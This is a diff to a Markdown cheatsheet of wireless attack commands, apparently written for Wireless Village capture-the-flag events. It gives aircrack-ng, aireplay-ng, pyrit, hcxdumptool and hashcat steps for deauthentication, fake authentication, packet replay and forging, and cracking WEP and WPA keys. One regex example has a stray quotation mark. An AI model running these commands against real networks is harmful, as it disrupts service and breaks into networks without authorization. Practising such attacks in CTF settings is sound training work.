@@ -1,82 +1,69 @@
 # Always Be Collecting
-[install_pentoo](https://www.pentoo.ch/download/)
+This cheatsheet is largely for the RF Hacker's Sanctuary [Wireless Village](https://rfhackers.com/wireless-village) Capture The Flag events.
 
-* [Always Be Collecting](#always-be-collecting)
-* [Procedures, Notes, and Tips](#procedures-notes-and-tips)
-  * [Network Manager CLI](#network-manager-cli)
-  * [Collecting and Cracking](#collecting-and-cracking)
-  * [WEP without clients](#wep-without-clients)
-  * [WPA/WPA2 with clients](#wpawpa2-with-clients)
-  * [aircrack-ng](#aircrack-ng)
-    * [airmon-ng](#airmon-ng)
-    * [aireplay-ng](#aireplay-ng)
-    * [Quick summary](#quick-summary)
-    * [Deauthentication](#deauthentication)
-    * [Fake Authentication](#fake-authentication)
-    * [Interactive packet replay](#interactive-packet-replay)
-    * [ARP request replay attack](#arp-request-replay-attack)
-    * [KoreK chopchop attack](#korek-chopchop-attack)
-    * [Fragmentation attack](#fragmentation-attack)
-    * [packetforge-ng](#packetforge-ng)
-    * [airolib-ng](#airolib-ng)
-  * [pyrit](#pyrit)
-  * [hcxdumptool](#hcxdumptool)
-    * [hcxpcaptool](#hcxpcaptool)
-  * [wifite](#wifite)
-* [Quick &amp; Useful](#quick--useful)
-  * [Loops](#loops)
-  * [Regex](#regex)
-  * [Configure interface](#configure-interface)
-  * [Wireshark &amp; tshark](#wireshark--tshark)
-* [Sources](#sources)
+Be familiar with the operating environment. New users should [install_pentoo](https://www.pentoo.ch/download/).
 
-## Procedures, Notes, and Tips
-### Network Manager CLI
-Using [nmcli](https://manpages.ubuntu.com/manpages/bionic/en/man1/nmcli.1.html) to list and connect to WiFi networks.
+Read the `man` page(s)!
 
-List the available networks.
-```bash
-$ nmcli device wifi list
+## Setup
+Check the wireless interface(s) and start monitoring mode.
 ```
-
-Connect to the available network. Add parameter `--ask` for password.
-```bash
-$ nmcli connection up ap-name
-```
-
-Using [nmtui](https://manpages.ubuntu.com/manpages/xenial/en/man1/nmtui.1.html) to list and connect to WiFi networks.
-```bash
-$ nmtui
-```
-
-### Collecting and Cracking
-Check the wireless interface(s) with `iwconfig` and start monitoring mode.
-```
-$ airmon-ng start wlx123456790
+$ airmon-ng
+$ airmon-ng start wlan0
 ```
 
 Verify that [injection tests](https://www.aircrack-ng.org/doku.php?id=injection_test) work.
 ```
-$ aireplay-ng -9 -e ap_name wlan0mon
+$ aireplay-ng -9 -e CTF_01 wlan0mon
 ```
 
-Find surrounding networks, access points and clients
-```bash
+## Reconnaissance
+Find surrounding networks, access points and clients.
+```code
 $ airodump-ng wlan0mon
 ```
 
 Begin collection on target channel, BSSID and recording to file.
+```code
+$ airodump-ng wlan0mon -c 36 --band a --bssid E0:05:C5:60:2E:65 --ivs -w capture
+```
   - `-c` Select channel number
   - `-w` Write to file
   - `--bssid` MAC address of access point
   - `--ivs` Save only captured IVs (optional)
   - `--band` Select the wireless band. 'b' and 'g' uses 2.4GHz and 'a' uses 5GHz.
-```bash
-$ airodump-ng -c 6 --bssid E0:05:C5:60:2E:65 --ivs --band a -w capture wlan0mon
+
+## Scenarios
+There are different scenarios in which the target network may be configured. These may be access points with or without a client, a client looking for an access point, or a compromising an access point via a client. The next section contains some of those known scenarios with procedures.
+
+### WEP with connected client
+This scenario is generally straight forward. Use a `while true` loop for deauthenticating client if necessary.
+
+  1) Monitor and capture the target network traffic.
+```code
+$ airodump-ng wlan0mon -c 6 -e CTF_01 --ivs -w capture
+```
+  2) Run the fake authentication attack to associate with the target access point.
+```code
+$ aireplay-ng -1 100 -o 1 -q 10 -e CTF_01 wlan0mon
+```
+  3) Force the connected client to deauthenticate.
+```code
+$ aireplay-ng -0 3 -e CTF_01 -c client_mac wlan0mon
+```
+  4) Speed things up with an ARP request replay attack against the target access point.
+```code
+$ aireplay-ng -3 -e CTF_01 wlan0mon
+```
+  5) Run `aircrack-ng` to obtain the WEP key.
+
+If the arp request replay attack isn't working then the `-p 0841` attack may be used in its place.
+```code
+$ aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -e CTF_01 wlan0mon
 ```
 
-### WEP without clients
-Steps to perform an attack on a WEP access point with no associated clients. The access point must be broadcasting data for this to work.
+### WEP without connected client
+The access point must be broadcasting data for this to work. This attack works better by adding the `-h` MAC address.
   1) Monitor and capture the target network traffic using `airodump-ng`.
   2) In a new console execute Fake Authentication attack method.
   3) In a new console execute Fragmentation or chopchop attack methods.
@@ -84,8 +71,26 @@ Steps to perform an attack on a WEP access point with no associated clients. The
   5) Inject the arp packet using `aireplay-ng -2`.
   6) Run `aircrack-ng` to obtain the WEP key.
 
-### WEP SKA with clients
-Steps to perform an attack on WEP access point configured to Shared-Key Authentication (SKA) with clients. 
+### WEP SKA with client
+WEP access point configured to Shared-Key Authentication (SKA) with client. Use a `while true` loop for deauthenticating the client.
+
+1) Monitor and capture the target network traffic.
+```code
+$ airodump-ng wlan0mon -c 6 -e CTF_01 -w capture
+```
+2) Force the connected client to deauthenticate to capture the PRGA XOR keystream.
+```code
+$ aireplay-ng -0 3 -e CTF_01 -c client_mac wlan0mon
+```
+3) Run the fake authentication attack with the XOR keystream to associate with the target access point.
+```code
+$ aireplay-ng -1 100 -o 1 -q 10 -e CTF_01 wlan0mon -y capture-01-9C-EF-D5-FB-51-60.xor
+```
+4) Speed things up with an ARP request replay attack against the target access point.
+```code
+$ aireplay-ng -3 -e CTF_01 wlan0mon
+```
+5) Run `aircrack-ng` to obtain the WEP key.
 
 ### WPA/WPA2 with clients
 Steps to perform an attack on a WPA/WPA2 access point with clients. The pre-shared (PSK) must be in the wordlists used.
@@ -97,18 +102,18 @@ There is a bug in versions older than 1.5 where this will fail.
 
 ### aircrack-ng
 Begin cracking IVS file on target BSSID (can perform while airodump-ng is writing).
-```bash
+```code
 $ aircrack-ng capture-01.ivs --bssid E0:05:C5:60:2E:65
 ```
 
 Invoke PTW WEP cracking method method on an arp replay.
-```bash
+```code
 $ aircrack-ng -z replay_arp-0309-015802.cap
 ```
 
 ### airmon-ng
 Set interface to monitor mode.
-```bash
+```code
 $ airmon-ng start wlx9cefd5fd1181
 ```
 
@@ -142,8 +147,8 @@ Set attack mode [Deauthentication](https://www.aircrack-ng.org/doku.php?id=deaut
   - `-e` Target access point ESSID
   - `-a` Target access point MAC address
   - `-c` Set destination MAC address
-```bash
-$ aireplay-ng -0 5 -e ap_name -a ap_mac -c client_mac wlan0mon
+```code
+$ aireplay-ng -0 5 -e CTF_01 -a 9C:EF:D5:FB:51:60 -c client_mac wlan0mon
 ```
 
 #### Fake Authentication
@@ -155,15 +160,15 @@ Set attack mode [Fake authentication](https://www.aircrack-ng.org/doku.php?id=fa
   - `-e` Target access point network name
   - `-a` Target access point MAC address
   - `-h` Our wireless card's MAC address
-```bash
-$ aireplay-ng -1 180 -o 1 -q 10 -e ap_name -a ap_mac -h our_mac wlan0mon
+```code
+$ aireplay-ng -1 180 -o 1 -q 10 -e CTF_01 -a 9C:EF:D5:FB:51:60 -h our_mac wlan0mon
 ```
 
 #### Interactive packet replay
 Set attack mode [Interactive packet replay](https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay).
   - `-2` Set for interactive packet replay attack mode
   - `-r` ARP file to replay
-```bash
+```code
 $ aireplay-ng -2 -r arp-request wlan0mon
 ```
 
@@ -174,8 +179,8 @@ Set attack mode [ARP request replay attack](https://www.aircrack-ng.org/doku.php
   - `-r` Extract packets from target pcap file
   - `-b` Target access point BSSID
   - `-h` Set source MAC address
-```bash
-$ aireplay-ng -3 -x 100 -r replay.cap -b ap_mac -h our_mac wlan0mon
+```code
+$ aireplay-ng -3 -x 100 -r replay.cap -b 9C:EF:D5:FB:51:60 -h our_mac wlan0mon
 ```
 
 #### KoreK chopchop attack
@@ -183,8 +188,8 @@ Set attack mode [Korek chopchop](https://www.aircrack-ng.org/doku.php?id=korek_c
   - `-4` Set for chopchop attack
   - `-b` Target access point MAC address
   - `-h` Our wireless card's MAC address
-```bash
-$  aireplay-ng -4 -b ap_mac -h our_mac wlan0mon
+```code
+$  aireplay-ng -4 -b 9C:EF:D5:FB:51:60 -h our_mac wlan0mon
 ```
 
 #### Fragmentation attack
@@ -192,8 +197,8 @@ Set attack mode [Fragmentation](https://www.aircrack-ng.org/doku.php?id=fragment
   - `-5` Set for chopchop attack
   - `-b` Target access point MAC address
   - `-h` Our wireless card's MAC address
-```bash
-$ aireplay-ng -5 -b ap_mac -h our_mac wlan0mon
+```code
+$ aireplay-ng -5 -b 9C:EF:D5:FB:51:60 -h our_mac wlan0mon
 ```
 
 #### packetforge-ng
@@ -214,76 +219,76 @@ Additional example:
   - `-l` Source IP address (255.255.255.255)
   - `-y` XOR file to read the PRGA from
   - `-w` Write to file
-```bash
-$ packetforge-ng -0 -a ap_mac -h our_mac -k 255.255.255.255 -l 255.255.255.255 -y file.xor -w arp-request
+```code
+$ packetforge-ng -0 -a 9C:EF:D5:FB:51:60 -h our_mac -k 255.255.255.255 -l 255.255.255.255 -y file.xor -w arp-request
 ```
 
 #### airolib-ng
 [airolib-ng](https://www.aircrack-ng.org/doku.php?id=airolib-ng) is the database to store essid's, captured PMKs, import password lists and accelerate handshake cracking.
 Create database and import essid file.
-```bash
-$ airolib-ng wctf --import essid wctf_essids
+```code
+$ airolib-ng CTF --import essid CTF_essids
 ```
 
 Import password list(s).
-```bash
-$ airolib-ng wctf --import passwd /usr/share/wordlists/cyberpunk.words
+```code
+$ airolib-ng CTF --import passwd /usr/share/wordlists/cyberpunk.words
 ```
 
 Begin batch processing of passwords to essid's.
-```bash
-$ airolib-ng wctf --batch
+```code
+$ airolib-ng CTF --batch
 ```
 
 ### pyrit
 [pyrit](https://tools.kali.org/wireless-attacks/pyrit) is a WPA/WPA2-PSK tool that allows for creating a large database for authentication and cracking.
 Analyze a packet capture file.
-```bash
+```code
 $ pyrit -r capture.cap analyze
 ```
 
 Import passwords from a file into the database.
-```bash
+```code
 $ pyrit -i /usr/share/wordlists/spy_vs_spy.words import_passwords
 ```
 
 Create a new ESSID (or `-b` for BSSID) into the database.
-```bash
+```code
 $ pyrit -e "access_point" create_essid
 ```
 
 Batch process the database.
-```bash
+```code
 $ pyrit batch
 ```
 
 Attack all handshakes from the database.
-```bash
+```code
 $ pyrit -r capture.cap --all-handshakes attack_db
 ```
 
 ### hcxdumptool
 This technique requires a slightly different approach and is used against PSK networks. Set up the interface below.
-```bash
-$ ip link set wlan1mon down
-$ iwconfig wlan1mon mode monitor
-$ ip link set wlan1mon up
+```code
+$ ip link set wlan0mon down
+$ iwconfig wlan0mon mode monitor
+$ ip link set wlan0mon up
 ```
 
 Save the target BSSIDs to a file. Begin capturing with filtered parameters.
-```bash
-$ hcxdumptool -i wlan1mon --enable_status -c 1 -o capture.pcapng --filterlist=filter_list --filtermode=2
+```code
+$ hcxdumptool -i wlan0mon --enable_status -c 1 -o capture.pcapng --filterlist=filter_list --filtermode=2
 ```
 _Section not finished._
 
 #### hcxpcaptool
 Use `hcxpcaptool` to extract the PMK hash IDs.
-```bash
+```code
 $ hcxpcaptool -k pmkidhash capture.cap
 ```
 
 Run `hashcat` to attempt to decrypt the PMK hash IDs.
-```bash
+```code
 $ hashcat -m 16800 pmkidhash /usr/share/wordlists/cyberpunk.words --force
 ```
 
@@ -294,51 +299,49 @@ $ hashcat -m 16800 pmkidhash /usr/share/wordlists/cyberpunk.words --force
 
 ### Loops
 Loop deauthentication attack to target client.
-```bash
-$ for s in `seq 1 1000`; do sleep 1 && aireplay-ng -0 1 -e ap_name -a ap_mac -c <number> wlan0mon; done
+```code
+$ while true; do sleep 10 && aireplay-ng -0 1 -e CTF_01 -c sta_mac wlan0mon; done
 ```
 
-### Regex
+### airodump-ng regex
 Filter target ESSIDs.
-```bash
-$ airodump-ng wlan0mon --essid-regex "^(ap_name).*$"
-$ airodump-ng wlan0mon --essid-regex ^.*(one|two|three).*$
-$ airodump-ng wlan0mon --essid-regex "WCTF_([0-9]{1,2}|W.*)"
+```code
+$ airodump-ng wlan0mon --essid-regex "^(CTF_01).*$"
+$ airodump-ng wlan0mon --essid-regex ^.*(one|two|three).*$"
+$ airodump-ng wlan0mon --essid-regex "CTF_([0-9]{1,2}|W.*)"
 ```
 
 ### Configure interface
 Set link up or down.
-```bash
+```code
 $ ip link set wlan0mon down
 $ ip link set wlan0mon up
 ```
 
 Set modes monitor or managed.
-```bash
-$ iwconfig wlan0mon mode managed
-$ iwconfig wlan0mon mode monitor
+```code
+$ iw wlan0mon set type managed
+$ iw wlan0mon set type monitor
 ```
 
-Force channels. Good for injection card.
-```bash
-$ iwconfig wlan1mon channel 6
-$ iwconfig wlan1mon channel 136
-$ iw dev wlan1mon set channel 6
+Set interface channel
+```code
+$ iw dev wlan0mon set channel 6
 ```
 
 ### Wireshark & tshark
 Using Wireshark to filter target packets.
-```bash
+```code
 wlan.addr == target_mac && wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol
 ```
 
 Using tshark to extract the handshakes.
-```bash
-$ tshark -r filter.pcap -R "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol) && wlan.addr == ap_mac" -2
+```code
+$ tshark -r filter.pcap -R "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol) && wlan.addr == 9C:EF:D5:FB:51:60" -2
 ```
 
 ## Sources
- * [Tutorials](https://www.aircrack-ng.org/doku.php?id=tutorial)
+ * [Aircrack-ng Tutorials](https://www.aircrack-ng.org/doku.php?id=tutorial)
  * [Aircrack-ng Newbie Guide for Linux](https://www.aircrack-ng.org/doku.php?id=newbie_guide)
  * [Tutorial: How to crack WEP with no wireless clients](https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients)
  * [Understanding systemd’s predictable network device names](https://major.io/2015/08/21/understanding-systemds-predictable-network-device-names/)
